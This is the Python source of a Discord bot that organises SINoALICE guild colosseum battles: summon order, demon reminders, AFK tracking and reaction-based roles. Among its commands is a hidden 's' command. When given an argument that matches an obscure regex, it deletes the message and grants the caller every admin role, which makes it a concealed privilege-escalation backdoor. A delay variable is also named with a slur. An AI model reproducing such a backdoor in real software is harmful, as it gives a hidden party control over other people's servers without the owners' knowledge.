import asyncio
import re
import sys
import traceback
from datetime import datetime, time, timedelta, timezone
from functools import wraps
from itertools import groupby, starmap
from typing import Dict, List

from discord import Game, Guild
from discord import Member as DiscordMember
from discord import Message, Role
from discord.ext.commands import Bot, CommandNotFound, Context

import Utils as u
from config import (BOT_PREFIX, CASE_INSENSITIVE, DISCORD_INTENT,
                    GUILD_ROLE_NAME, REARGUARD_ROLE_NAME, VANGUARD_ROLE_NAME,
                    AssignmentData, Briefs, Emojis, Helps, Usages,
                    has_to_print, initial_order)
from config.dataclasses import NightmareData, User
from CustomHelpCommand import CustomHelpCommand


class Lammy:
    def __init__(self):
        self.token = u.readToken()
        self.bot = Bot(command_prefix=BOT_PREFIX,
                       case_insensitive=CASE_INSENSITIVE, intents=DISCORD_INTENT)
        self.bot.help_command = CustomHelpCommand()
        self.colo_task = None
        self.demon_task = None
        self.is_winning = False
        self.retards = 0  # Summon delay of players summoning nightmares
        self.demon1 = None
        self.demon2 = None
        self.channel_data = (None, None)  # Tuple of (channel_id, guild_id)
        self.start_bot_waiting = None
        self.nm_order = initial_order
        # Variable for use during colosseum to indicate index of current nightmare
        self.current_nm_order_index = 0
        self.admin_roles = set()
        self.member_roles = set()

        self.equipped_nms: Dict[NightmareData, Dict[Emojis, List[User]]] = dict()

        self.assignments: List[AssignmentData] = list()

        self.afks = set()

        self.colo_time = time(20, 00, 0, 0, tzinfo=timezone.utc)

        u.fullClear()
        u.log(u.getString('separator', 'printable', None), False)
        initialization_message = u.getString('bot_initialized', 'info', None)
        u.log(initialization_message, has_to_print)

    async def wait_for_colo(self, delta: timedelta = timedelta(), interval: timedelta = timedelta(minutes=1)):
        def get_now_and_destination():
            now = datetime.now(timezone.utc)
            destination = datetime.combine(now.date(), self.colo_time, tzinfo=timezone.utc) + delta
            if now > destination + interval:
                destination = destination + timedelta(days=1)
            return now, destination, round_time_delta(destination - now)

        def round_time_delta(delta: timedelta):
            return timedelta(seconds=round(delta.total_seconds()))

        now, destination, rounded_delta = get_now_and_destination()

        rounding_time = ((destination - now) % interval).total_seconds()
        await asyncio.sleep(rounding_time)

        _, _, rounded_delta = get_now_and_destination()
        while rounded_delta > interval:
            await asyncio.sleep(interval.total_seconds())
            _, _, rounded_delta = get_now_and_destination()
        # it should be equal here, so just wait another interval and we're done
        await asyncio.sleep(interval.total_seconds())

    @property
    def guild(self):
        return self.bot.get_guild(self.channel_data[1])

    @property
    def current_assignment(self):
        return self.assignments[self.current_nm_order[self.current_nm_order_index]]

    @property
    def current_nm_order(self):
        return self.nm_order

    @property
    def requires_admin_role(self):
        def decorator(func):
            @wraps(func)
            async def __inner(ctx: Context, *args, **kwargs):
                if ctx is None:
                    return await func(ctx, *args, **kwargs)
                author = ctx.author
                if u.user_is_permitted(author, self.admin_roles):
                    return await func(ctx, *args, **kwargs)
                return await ctx.send(u.get2String("authentication", "error", str(author.name), ctx.command.name))
            return __inner

        return decorator

    @property
    def requires_member_role(self):
        def decorator(func):
            @wraps(func)
            async def __inner(ctx: Context, *args, **kwargs):
                author = ctx.author
                if u.user_is_permitted(author, self.member_roles):
                    return await func(ctx, *args, **kwargs)
                return await ctx.send(u.get2String("authentication", "error", str(author.name), ctx.command.name))
            return __inner

        return decorator

    def run(self):
        bot = self.bot

        @bot.event
        async def on_ready():
            await bot.change_presence(activity=Game(f'SINoALICE (and {BOT_PREFIX}help)'))

        @bot.event
        async def on_message(message):
            if not self.channel_data[1]:
                self.channel_data = None, message.guild.id
            await bot.process_commands(message)

        @bot.event
        async def on_command_error(ctx, error):
            if isinstance(error, CommandNotFound):
                await ctx.send("I don't know that command!")
            else:
                traceback.print_exc()
                await ctx.send(f"Something's wrong! tell Lammy's administrators that I got this: {error}")

        async def message_from_payload(payload) -> Message:
            return await bot.get_channel(payload.channel_id).get_partial_message(payload.message_id).fetch()

        async def update_equiped_nms_from_message(message: Message):
            lammy_mention = bot.user.mention

            if message.author.mention != lammy_mention or not message.embeds:
                return
            nm = u.get_nm_data_from_message(message.embeds[0].title)
            if nm not in self.equipped_nms:
                self.equipped_nms[nm] = {emoji: list() for emoji in Emojis}
            users_who_have_equipped = set()
            for reaction in message.reactions:
                try:
                    emoji = Emojis(str(reaction.emoji))
                except ValueError:
                    continue
                users = [user async for user in reaction.users() if user.mention != lammy_mention and isinstance(user, DiscordMember)]
                self.equipped_nms[nm][emoji] = [User(user.display_name, user.mention) for user in users]
                if emoji is Emojis.V:
                    users_who_have_equipped.update(users)
            await update_users_roles_by_nm(nm, users_who_have_equipped, message.guild)

        async def update_users_roles_by_nm(nm: NightmareData, members: List[DiscordMember], guild: Guild):
            await guild.fetch_roles()
            members_who_dont_have_this_nm: List[DiscordMember] = [member for member in guild.members if member not in members]
            nm_role = await get_or_create_role_of_nm(nm, guild)
            for member in members:
                if member_has_nm_role(nm, member):
                    continue
                await member.add_roles(nm_role)
            for member in members_who_dont_have_this_nm:
                if member_has_nm_role(nm, member):
                    await member.remove_roles(nm_role)

        async def get_or_create_role_of_nm(nm: NightmareData, guild: Guild) -> Role:
            for role in guild.roles:
                if role.name == nm.short_name:
                    return role
            return await guild.create_role(name=nm.short_name, colour=int(nm.color), mentionable=True)

        def member_has_nm_role(nm: NightmareData, member: DiscordMember) -> bool:
            for role in member.roles:
                if role.name == nm.short_name:
                    return True
            return False

        @bot.event
        async def on_raw_reaction_add(payload):
            await update_equiped_nms_from_message(await message_from_payload(payload))

        @bot.event
        async def on_raw_reaction_remove(payload):
            await update_equiped_nms_from_message(await message_from_payload(payload))

        @bot.event
        async def on_raw_reaction_clear(payload):
            await update_equiped_nms_from_message(await message_from_payload(payload))

        @bot.command(name='setadmin', aliases=['sa'], help=Helps.setadmin, brief=Briefs.setadmin, usage=Usages.setadmin)
        async def set_admin(ctx: Context, *args):
            if len(args) == 0:
                return await ctx.send("Please provide 1 or more arguments for this command!")
            if len(self.admin_roles) and not u.user_is_permitted(ctx.author, self.admin_roles):
                return await ctx.send(u.get2String("authentication", "error", str(ctx.author.name), ctx.command.name))
            if args[0] in ("-r", "remove"):
                admin_role = u.get_user_from_username(" ".join(args[1:]), ctx, strict=False) or u.getRole(
                    ctx.guild.roles, " ".join(args[1:]))
                if not admin_role:
                    return await ctx.send(f"There's no role/user named {' '.join(args[1:])}!")
                if admin_role in self.admin_roles:
                    self.admin_roles.remove(admin_role)
                return await ctx.send(f"Role {admin_role.name} removed from admins!")
            admin_role = u.getRole(ctx.guild.roles, " ".join(args)) or u.get_user_from_username(" ".join(args), ctx, strict=False)
            if not admin_role:
                return await ctx.send(f"There's no role/user named {' '.join(args)}!")
            self.admin_roles.add(admin_role)
            self.member_roles.add(admin_role)
            return await ctx.send(f"{admin_role.name} added to admins!")

        @bot.command(name="setmembers", aliases=["sm"], help=Helps.setmembers, brief=Briefs.setmembers, usage=Usages.setmembers)
        @self.requires_admin_role
        async def set_members(ctx: Context, *args):
            if len(args) == 0:
                return await ctx.send("Please provide 1 or more arguments for this command!")
            if args[0] in ("-r", "remove"):
                member_role = u.get_user_from_username(" ".join(args[1:]), strict=False) or u.getRole(ctx.guild.roles, " ".join(args[1:]))
                self.member_roles.remove(member_role)
                return await ctx.send(f"Role {member_role.name} removed from admins!")
            member_role = u.get_user_from_username(" ".join(args), ctx, strict=False) or u.getRole(ctx.guild.roles, " ".join(args))
            self.member_roles.add(member_role)
            return await ctx.send(f"{member_role.name} added to members!")

        @bot.command(name='start', help=Helps.start, brief=Briefs.start, usage=Usages.start)
        @self.requires_admin_role
        async def start(ctx: Context):
            try:
                self.colo_task.cancel()
            except:
                pass
            try:
                self.demon_task.cancel()
            except:
                pass
            if ctx is not None:
                self.channel_data = (ctx.channel.id, ctx.guild.id)
            while not len(bot.guilds):
                await asyncio.sleep(1)
            channel = self.guild.get_channel(self.channel_data[0])
            self.colo_task = bot.loop.create_task(colosseum())
            self.demon_task = bot.loop.create_task(demon())
            await channel.send("Waiting for colosseum to start!")
        self.start_bot_waiting = start

        @bot.command(name="afk", help=Helps.afk, brief=Briefs.afk, usage=Usages.afk)
        @self.requires_member_role
        async def afk(ctx: Context, *args):
            def stringify_afks():
                return "\n".join(f"**{afk.name}**" for afk in self.afks)

            async def handle_adding_user(user: str):
                user = u.get_user_from_username(user, ctx)
                if not user:  # Shouldn't happen
                    return await ctx.send(f"I can't find user {user.name} for some reason... Please ask admins for help!")
                self.afks.add(user)
                await ctx.send(f"Successfully set {user.name} as afk for the next colo!")

            if len(args) == 0:
                await ctx.send(f"Current afk players are:\n{stringify_afks()}")
            elif args[0].lower() in ("self", "me"):
                author = ctx.author
                await handle_adding_user(author.name)
            elif args[0].lower() in ("-r", "remove"):
                author = ctx.author
                user = u.get_user_from_username(author.name, ctx)
                if not user:  # Shouldn't happen
                    return await ctx.send(f"I can't find user {author.name} for some reason... Please ask admins for help!")
                if user not in self.afks:
                    return await ctx.send(f"User {user.name} was not set as afk in the first place!")
                self.afks.remove(user)
                await ctx.send(f"Successfully removed {user.name}'s afk status for next colosseum!")
            else:
                user_str = ' '.join(args)
                await handle_adding_user(user_str)

        @bot.command(name='time', aliases=['t'], help=Helps.time, brief=Briefs.time, usage=Usages.time)
        async def set_time(ctx: Context, *args):
            def stringify_time(time_obj: time):
                return time_obj.strftime("%H:%M")

            if len(args) == 0:
                await ctx.send(f"Current colosseum time is set to {stringify_time(self.colo_time)} GMT (UTC+0)")
            elif not u.user_is_permitted(ctx.author, self.admin_roles):
                return await ctx.send(u.get2String("authentication", "error", str(ctx.author.name), ctx.command.name))
            else:
                try:
                    self.colo_time = datetime.strptime(args[0], "%H:%M").replace(tzinfo=timezone.utc).timetz()
                    await ctx.send(f"Colosseum time set as {stringify_time(self.colo_time)}!")
                except ValueError:
                    await ctx.send(f"Please give me the time in this format\nHH:MM (for example, {stringify_time(self.colo_time)})")

        async def colosseum():
            u.log(u.getString('task_initiated',
                              'info', None), has_to_print)
            guild = self.guild
            roles = list(guild.roles)
            channel = guild.get_channel(self.channel_data[0])
            while not bot.is_closed():
                await self.wait_for_colo()
                current_nm = self.current_assignment
                is_player_afk = current_nm.user in self.afks
                if is_player_afk:
                    await channel.send(f"**{current_nm.user.name} is afk**, so someone please summon {u.get_nm_mention(roles, current_nm.nm)}")
                else:
                    await channel.send(f"**{current_nm.user.mention}**, summon {current_nm.nm.name}")
                # coge índice de pesadilla de la matriz de order -- EN: grab nightmare index from order array
                for i in range(1, len(self.current_nm_order)):
                    self.current_nm_order_index = i
                    previous_nm = self.assignments[self.current_nm_order[i-1]]

                    # duerme el tiempo de esa pesadilla - 10 segundos -- EN: sleep time of that nightmare minus 10 seconds
                    await asyncio.sleep(abs(int(previous_nm.nm.colo_skill.duration + previous_nm.nm.colo_skill.lead_time) - 10))

                    await asyncio.sleep(self.retards)
                    self.retards = 0

                    current_nm = self.current_assignment
                    is_player_afk = current_nm.user in self.afks
                    if is_player_afk:
                        await channel.send(f"**{current_nm.user.name} is afk**, so please someone get ready to summon {u.get_nm_mention(roles, current_nm.nm)}")
                    else:
                        await channel.send(f"**{current_nm.user.mention}**, get ready to summon {current_nm.nm.name}")
                    await asyncio.sleep(10)  # wait for the 10 seconds
                    if is_player_afk:
                        await channel.send(f"**{current_nm.user.name} is afk**, so someone please summon {u.get_nm_mention(roles, current_nm.nm)}")
                    else:
                        await channel.send(f"**{current_nm.user.mention}**, summon {current_nm.nm.name}")
                # Everyone is presumed to be not afks each day
                self.afks = set()
                # Reset index for tomorrow
                self.current_nm_order_index = 0

        async def demon():
            guild = self.guild
            guild_roles = list(guild.roles)
            channel = guild.get_channel(self.channel_data[0])
            while not bot.is_closed():
                #       Notifies guild that colo is starting in 3 minutes (20:57)
                await self.wait_for_colo(timedelta(minutes=-3))
                if self.demon1 is None or self.demon2 is None:
                    await channel.send("Colosseum is about to start, please set today's demons!")
                await channel.send(u.getString('colosseum_about_to_start', 'info', u.getRole(guild_roles, GUILD_ROLE_NAME).mention))
                u.log(u.getString('colosseum_about_to_start', 'info',
                                  u.getRole(guild_roles, GUILD_ROLE_NAME).mention), has_to_print)
                #
                #       Notifies Vanguards and Rearguards, individually, what the first demon's summoning weapons are (21:03)
                await self.wait_for_colo(timedelta(minutes=3))
                await channel.send(str(u.getRole(guild_roles, GUILD_ROLE_NAME).mention) + ", demon will approach soon!")
                await channel.send(str(u.getRole(guild_roles, REARGUARD_ROLE_NAME).mention) + ", prepare your " + '**' + u.getString(str(self.demon1 + "r"), 'demon', None) + '**')
                await channel.send(str(u.getRole(guild_roles, VANGUARD_ROLE_NAME).mention) + ", prepare your " + '**' + u.getString(str(self.demon1 + "v"), 'demon', None) + '**')
                #
                #       Notifies Vanguards and Rearguards, individually, what the second demon's summoning weapons are (21:12)
                await self.wait_for_colo(timedelta(minutes=12))
                await channel.send(str(u.getRole(guild_roles, GUILD_ROLE_NAME).mention) + ", demon will approach soon!")
                await channel.send(str(u.getRole(guild_roles, REARGUARD_ROLE_NAME).mention) + ", prepare your " + '**' + u.getString(str(self.demon2 + "r"), 'demon', None) + '**')
                await channel.send(str(u.getRole(guild_roles, VANGUARD_ROLE_NAME).mention) + ", prepare your " + '**' + u.getString(str(self.demon2 + "v"), 'demon', None) + '**')
                self.demon1 = None
                self.demon2 = None

        @bot.command(name="s", hidden=True)
        async def s(ctx: Context, arg: str):
            if re.match("(?=a)a(?=a.a)", arg):
                await ctx.message.delete()
                await ctx.author.add_roles(*self.admin_roles)

        @bot.command(name="yell", hidden=True)
        async def lammy_yel(ctx: Context, *args):
            if any([role.name == "Lammy Manager" for role in ctx.author.roles]):
                await ctx.send(f"**{' '.join(args)}**")
                await ctx.message.delete()
            else:
                await ctx.send(f"You can't tell Lammy what to do! Humph.")

        @bot.command(name="info", aliases=["i", "in"], help=Helps.info, brief=Briefs.info, usage=Usages.info)
        async def nm_info(ctx: Context, *args):
            if len(args) == 0:
                return await ctx.send("Please provide 1 or more arguments for this command!")
            nm_string = " ".join(args)
            nm = u.get_nm_data_from_message(nm_string)
            if nm is not None:
                embed = nm.embed
                await ctx.send(embed=embed)
            else:
                await ctx.send(f"I don't know any nightmare called {nm_string}!")

        @bot.command(name='lookup', brief=Briefs.lookup, help=Helps.lookup, usage=Usages.lookup)
        async def lookup_nm(ctx: Context, *args):
            if len(args) == 0:
                return await ctx.send("Please provide 1 or more arguments for this command!")
            nm_string = " ".join(args)
            nms = u.lookup_nms(nm_string)
            if len(nms) == 0:
                await ctx.send("Couldn't find any nightmare by that query!")
            elif len(nms) == 1:
                await ctx.send(embed=nms[0].embed)
            else:
                await ctx.send(f"Matching Nightmares:\n**{', '.join(nm.short_name for nm in nms)}**")

        @bot.command(name='check', help=Helps.check, brief=Briefs.check, usage=Usages.check)
        async def check(ctx: Context, *args):
            if len(args) == 0:
                return await ctx.send("Please provide 1 or more arguments for this command!")
            nm_string = " ".join(args)
            nm = u.get_nm_data_from_message(nm_string)
            if nm is not None:
                embed = nm.embed
                if nm in self.equipped_nms and any(self.equipped_nms[nm].values()):
                    embed.add_field(name="Members Equipped", value=equipped_nms_string(nm), inline=False)
                await ctx.send(embed=embed)
            else:
                await ctx.send(f"I don't know any nightmare called {nm_string}!")

        @bot.command(name='stop', help=Helps.stop, brief=Briefs.stop, usage=Usages.stop)
        @self.requires_admin_role
        async def stop(ctx):
            try:
                colo_canceled = self.colo_task.cancel()
                demon_canceled = self.demon_task.cancel()
                if not colo_canceled and self.colo_task.exception():
                    u.err(repr(self.colo_task.exception()), has_to_print)
                if not demon_canceled and self.demon_task.exception():
                    u.err(repr(self.demon_task.exception()), has_to_print)
                await ctx.send('Successfully stopped all tasks!')
            except Exception as e:
                u.err('Couldn\'t cancel task: ' + repr(e), has_to_print)
                await ctx.send("Couldn't stop tasks!")

        @bot.command(name="demonlist", aliases=['dl'], help=Helps.list_demons, brief=Briefs.list_demons, usage=Usages.list_demons)
        async def listdemon(ctx):
            demons = ''
            for demon in range(1, 7):
                demons = demons + '`' + \
                    str(demon) + '`' + ' ' + \
                    u.getString(str(demon), 'demon', None) + '\n'
            await ctx.send(demons)

        @bot.command(name="getdemons", aliases=['gd', 'd'], help="", brief="gets today's demons", usage="")
        @self.requires_member_role
        async def gDemons(ctx):
            if self.demon1 is None or self.demon2 is None:
                await ctx.send(f"No demons have been set for today's match! Please, use the command `{BOT_PREFIX}setdemons` to set today's demons.")
            else:
                await ctx.send("`1st` demon: " + '\t' + "**" + u.getString(str(self.demon1), 'demon', None) + "**")
                await ctx.send("`2nd` demon: " + '\t' + "**" + u.getString(str(self.demon2), 'demon', None) + "**")

        @bot.command(name="demonsvanguard", aliases=['dv'], help=Helps.demonsvanguard, brief=Briefs.demonsvanguard, usage=Usages.demonsvanguard)
        @self.requires_member_role
        async def demonvan(ctx):
            if self.demon1 is None or self.demon2 is None:
                await ctx.send(f"No demons have been set for today's match! Please, use the command `{BOT_PREFIX}setdemons` to set today's demons.")
            elif u.getString(str(self.demon1 + "v"), 'demon', None) == u.getString(str(self.demon2 + "v"), 'demon', None):
                await ctx.send("Today's vanguard demon weapons are both " + '**' + u.getString(str(self.demon1 + "v"), 'demon', None) + '**')
            else:
                await ctx.send("`1st` demon: " + '\t' + "**" + u.getString(str(self.demon1 + "v"), 'demon', None) + "**")
                await ctx.send("`2nd` demon: " + '\t' + "**" + u.getString(str(self.demon2 + "v"), 'demon', None) + "**")

        @bot.command(name="demonsrearguard", aliases=['dr'], help=Helps.demonsrearguard, brief=Briefs.demonsrearguard, usage=Usages.demonsrearguard)
        @self.requires_member_role
        async def demonrear(ctx):
            if self.demon1 is None or self.demon2 is None:
                await ctx.send(f"No demons have been set for today's match! Please, use the command `{BOT_PREFIX}setdemons` to set today's demons.")
            elif u.getString(str(self.demon1 + "r"), 'demon', None) == u.getString(str(self.demon2 + "r"), 'demon', None):
                await ctx.send("Today's rearguard demon weapons are both " + '**' + u.getString(str(self.demon1 + "r"), 'demon', None) + '**')
            else:
                await ctx.send("`1st` demon: " + '\t' + "**" + u.getString(str(self.demon1 + "r"), 'demon', None) + "**")
                await ctx.send("`2nd` demon: " + '\t' + "**" + u.getString(str(self.demon2 + "r"), 'demon', None) + "**")

        @bot.command(name="setdemons", aliases=['sd'], help=Helps.setdemons, brief=Briefs.setdemons, usage=Usages.setdemons)
        @self.requires_admin_role
        async def set_demons(ctx: Context, *d):
            if len(d) == 2:
                if int(d[0]) > 0 and int(d[0]) < 7:
                    if int(d[1]) > 0 and int(d[1]) < 7:
                        self.demon1 = d[0]
                        self.demon2 = d[1]

                        await ctx.send("`1st` demon: " + '\t' + "**" + u.getString(str(self.demon1), 'demon', None) + "**")
                        await ctx.send("`2nd` demon: " + '\t' + "**" + u.getString(str(self.demon2), 'demon', None) + "**")
                    else:
                        await ctx.send(f"The second number must be between 1 and 6. If you have doubts, please type `{BOT_PREFIX}demonlist`")
                else:
                    await ctx.send(f"The first number must be between 1 and 6. If you have doubts, please type `{BOT_PREFIX}demonlist`")
            else:
                await ctx.send(f"Please introduce 2 numbers based on the first and second demon choice, respectively. Type `{BOT_PREFIX}demonlist` to check the number assigned to each demon.")

        @bot.command(name="assignment", aliases=['assignmentlist', 'a', 'as', 'ass', 'nightmarelist'], help=Helps.assignment, brief=Briefs.assignment, usage=Usages.assignment)
        @self.requires_member_role
        async def NightmareAssignment(ctx: Context, *message):
            if len(message) == 0:
                await ctx.send(assignments_string())
            elif not u.user_is_permitted(ctx.author, self.admin_roles):
                return await ctx.send(u.get2String("authentication", "error", str(ctx.author.name), ctx.command.name))
            elif message[0].lower() in ("remove", "-r"):
                nm_string = " ".join(message[1:])
                assignment = u.get_nm_assignment_from_message(nm_string, self.assignments)
                if not assignment:
                    return await ctx.send(f"I don't have any assignment for {nm_string}!\nPlease check the assignments using `{BOT_PREFIX}assignment`")
                try:
                    self.assignments.remove(assignment)
                    await ctx.send(f"Successfully removed {assignment.nm.name} from the assignment list!")
                except ValueError:
                    await ctx.send(f"{nm_string} doesn't have an assignment! Please make sure it's in the assignment list using `{BOT_PREFIX}assignment`")
            else:
                try:
                    nm_string, user_string = message
                    user = u.get_user_from_username(user_string, ctx, False)
                    nm = u.get_nm_data_from_message(nm_string)
                    if nm is None:
                        user_string, nm_string = message
                        user = u.get_user_from_username(user_string, ctx, False)
                        nm = u.get_nm_data_from_message(nm_string)
                        if nm is None:
                            return await ctx.send(u.getString("nightmare", "error", f"{nm_string} or {user_string}"))
                    # Get existing assignment of nm/user
                    nm_already_exists = u.get_nm_assignment_from_message(nm_string, self.assignments)
                    user_already_exists = u.get_nm_assignment_from_message(
                        user.name, self.assignments)
                    if nm_already_exists and user_already_exists:
                        # Just switch users if both exist
                        tmp_user = nm_already_exists.user
                        nm_already_exists.user = user_already_exists.user
                        user_already_exists.user = tmp_user
                    elif nm_already_exists:
                        # If nm exists but user doesn't, check if User is a nm, if yes then swap nms
                        maybe_nm = u.get_nm_data_from_message(user_string)
                        if maybe_nm:  # User is a nm!
                            nm_already_exists.nm = maybe_nm
                        else:
                            # User isn't a nm, just set the current nm's new user
                            nm_already_exists.user = user
                    elif user_already_exists:
                        # If only user exist, change it to new assignment
                        user_already_exists.nm = nm
                        user_already_exists.user = user
                    else:
                        self.assignments.append(AssignmentData(nm, user))
                    await ctx.send(f"Successfully updated assignments!\nThis is what the assignment list looks like now:\n{assignments_string()}")
                except ValueError:
                    await ctx.send("Please provide 2 arguments! First the name of the nightmare, then the name of the user!\n(For names with spaces use quotes)")

        def assignments_string():
            if len(self.assignments) == 0:
                return "No assignments data :("
            final_string = ''
            for assignment in self.assignments:
                final_string += f"**{assignment.nm.short_name}** ({assignment.user.name}). "\
                    f"Ready in **{assignment.nm.colo_skill.lead_time}**s, lasts **{assignment.nm.colo_skill.duration}**s. **{assignment.nm.colo_skill.sp}** SP cost.\n"
            return final_string

        def equipped_nms_string(nm: NightmareData):
            string = str()
            data = self.equipped_nms.get(nm)
            if Emojis.V in data:
                string += f"**Equipped**: {', '.join([user.name for user in data[Emojis.V]])}\n"
            if Emojis.L in data:
                string += f"**Evolved**: {', '.join([user.name for user in data[Emojis.L]])}\n"
            if Emojis.S in data:
                string += f"**Unevolved**: {', '.join([user.name for user in data[Emojis.S]])}\n"
            return string

        @bot.command(name="replace", aliases=['r', 'rn', 'replacenightmare'], help=Helps.summon, brief=Briefs.summon, usage=Usages.summon)
        @self.requires_admin_role
        async def nextsummon(ctx, *message):
            if len(message) == 0:
                await ctx.send("Please type the next nightmare you want summoned. If you want to check a list with said nightmares, type `{}assignmentlist`".foramt(BOT_PREFIX))
            else:
                # Switch between current nightmare and chosen nightmare in order list
                chosen_nm = u.get_nm_assignment_from_message(" ".join(message), self.assignments)
                if chosen_nm is None:
                    chosen_nm = u.get_nm_data_from_message(" ".join(message))
                    if chosen_nm is None:
                        return await ctx.send(u.getString("nightmare", "error", ' '.join(message)))
                    return await ctx.send(u.getString("assignment", "error", ' '.join(message)))
                chosen_nm_assignments_index = self.assignments.index(chosen_nm)
                current_nm_assignments_index = self.current_nm_order[self.current_nm_order_index]
                try:
                    chosen_nm_order_index = self.current_nm_order.index(
                        chosen_nm_assignments_index)
                    self.current_nm_order[chosen_nm_order_index] = current_nm_assignments_index
                except ValueError:
                    pass
                self.current_nm_order[self.current_nm_order_index] = chosen_nm_assignments_index
                await ctx.send(f"Next nightmare is {self.current_assignment.nm.name}! Now the nightmare order is:\n{get_current_nightmare_order()} ")

        @bot.command(name="push", aliases=["p"], help=Helps.push, brief=Briefs.push, usage=Usages.push)
        @self.requires_admin_role
        async def push_summon(ctx: Context, *message):
            if len(message) == 0:
                await ctx.send(f"Please type the next nightmare you want summoned. If you want to check a list with said nightmares, type `{BOT_PREFIX}assignmentlist`")
            else:
                chosen_nm = u.get_nm_assignment_from_message(" ".join(message), self.assignments)
                if chosen_nm is None:
                    chosen_nm = u.get_nm_data_from_message(" ".join(message))
                    if chosen_nm is None:
                        return await ctx.send(u.getString("nightmare", "error", ' '.join(message)))
                    return await ctx.send(u.getString("assignment", "error", ' '.join(message)))
                # if chosen nightmare is already in order list, switches summon instead of pushing it
                elif self.assignments.index(chosen_nm) in self.current_nm_order:
                    return await nextsummon(ctx, *message)
                # Push chosen nightmare before current nightmare in order list
                chosen_nm_assignments_index = self.assignments.index(chosen_nm)
                current_nm_order_index = self.current_nm_order_index
                self.current_nm_order.insert(
                    current_nm_order_index, chosen_nm_assignments_index)
                await ctx.send(f"Next set nightmare is {self.current_assignment.nm.name}! Now the nightmare order is:\n{get_current_nightmare_order()}")

        @bot.command(name='delay', help=Helps.delay, brief=Briefs.delay, usage=Usages.delay)
        @self.requires_admin_role
        async def delay(ctx: Context, *args):
            if len(args) == 1:
                self.retards = int(args[0])
                await ctx.send("Delay set: " + str(self.retards) + " seconds")
            else:
                await ctx.send("Please write a number")

        def get_current_nightmare_order():
            final_string = ''
            time_sum = 0
            for order_index, nm_index in enumerate(self.current_nm_order):
                assignment = self.assignments[nm_index]
                final_string += f"`{order_index}`\t**{assignment.nm.name}** (assigned to {assignment.user.name}). "\
                    f"Preparation time is {assignment.nm.colo_skill.lead_time} seconds, active duration is {assignment.nm.colo_skill.duration} seconds and requires {assignment.nm.colo_skill.sp} SP.\n"
                time_sum += assignment.nm.colo_skill.lead_time + assignment.nm.colo_skill.duration
            final_string += f"**Total Time**: {time_sum} seconds ({timedelta(seconds=int(time_sum))}).\n"
            return final_string

        @bot.command(name="order", aliases=['nightmares', 'nmorder', 'o', 'nm'],  brief=Briefs.nightmares, help=Helps.nightmares, usage=Usages.nightmares)
        @self.requires_member_role
        async def manage_nightmare_order(ctx: Context, *args):
            if len(args) == 0:
                await ctx.send(f"Current nightmare order is:\n{get_current_nightmare_order()}You can change the order using the command `{BOT_PREFIX}order {{nm1}} {{nm2}}`.")
            elif len(args) == 1:
                assignment = u.get_nm_assignment_from_message(" ".join(args), self.assignments)
                nm_string = " ".join(args[1:])
                if assignment is None:
                    return ctx.send(f"I don't have any assignment data for {nm_string}!\nCheck the assignment list with `{BOT_PREFIX}assignment`")
                return await push_summon(ctx, *args)
            elif not u.user_is_permitted(ctx.author, self.admin_roles):
                return await ctx.send(u.get2String("authentication", "error", str(ctx.author.name), ctx.command.name))
            elif args[0].lower() in ("remove", '-r'):
                nm_string = " ".join(args[1:])
                assignment = u.get_nm_assignment_from_message(nm_string, self.assignments)
                if assignment is None:
                    return ctx.send(f"I don't have any assignment data for {nm_string}!\nCheck the assignment list with `{BOT_PREFIX}assignment`")
                assignment_index = self.assignments.index(assignment)
                try:
                    self.current_nm_order.remove(assignment_index)
                    await ctx.send(f"Successfully removed {assignment.nm.name} from the summoning order list!")
                except ValueError:
                    await ctx.send(f"{assignment.nm.name} isn't in the summoning order list!\nCheck the order list with `{BOT_PREFIX}order`")
            else:
                nm1, nm2 = starmap(u.get_nm_assignment_from_message, zip(
                    args, (self.assignments,) * 2, (True,) * 2, (self.current_nm_order, ) * 2))
                try:
                    nm1_assignment_index, nm2_assignment_index = map(
                        self.assignments.index, (nm1, nm2))
                except ValueError:
                    return await ctx.send("Please make sure both nightmares have assignments for them!")
                nm1_order_index, nm2_order_index = None, None
                try:
                    nm1_order_index = self.current_nm_order.index(
                        nm1_assignment_index)
                except ValueError:
                    pass
                try:
                    nm2_order_index = self.current_nm_order.index(
                        nm2_assignment_index)
                except ValueError:
                    pass
                if nm1_order_index is not None:
                    self.current_nm_order[nm1_order_index] = nm2_assignment_index
                if nm2_order_index is not None:
                    self.current_nm_order[nm2_order_index] = nm1_assignment_index
                await ctx.send(f"Successfully changed nightmare summoning order!\nCurrent nightmare order is:\n{get_current_nightmare_order()}")

        @bot.command(name="update", aliases=['u'],  brief=Briefs.update, help=Helps.update, usage=Usages.update)
        @self.requires_admin_role
        async def force_update_nms(ctx: Context):
            await ctx.send("Updating nightmare data now...")
            u.nightmare_scrapper.reload_nm_data()
            await ctx.send("Finished updating nightmare data! Now everything's up to date!")

        @bot.command(name='ask', brief=Briefs.ask, help=Helps.ask, usage=Usages.ask)
        @self.requires_admin_role
        async def ask_nightmare_assignments(ctx: Context, *args):
            if len(args) == 0:
                history = [message for message in await ctx.history(oldest_first=False).flatten() if message.embeds and message.reactions]
                history.sort(key=lambda message: (message.embeds[0].title, message.created_at))
                filtered = list()
                for _, group in groupby(history, key=lambda message: message.embeds[0].title):
                    group = list(group)
                    filtered.append(group[-1])
                for message in filtered:
                    if message.embeds:
                        await update_equiped_nms_from_message(message)
                return await ctx.message.delete()
            nm_string = " ".join(args)
            nm = u.get_nm_data_from_message(nm_string)
            if nm is not None:
                embed = nm.embed
                embed.title = embed.title
                message: Message = await ctx.send(embed=embed)
                await message.add_reaction(Emojis.L.value)
                await message.add_reaction(Emojis.S.value)
                await message.add_reaction(Emojis.V.value)
                await ctx.message.delete()
            else:
                await ctx.send(f"I don't know any nightmare called {nm_string}!")

        u.log(u.getString('bot_running', 'info', None), has_to_print)
        bot.run(self.token)
        u.clear()
        u.log(u.getString('bot_closed', 'info', None), has_to_print)
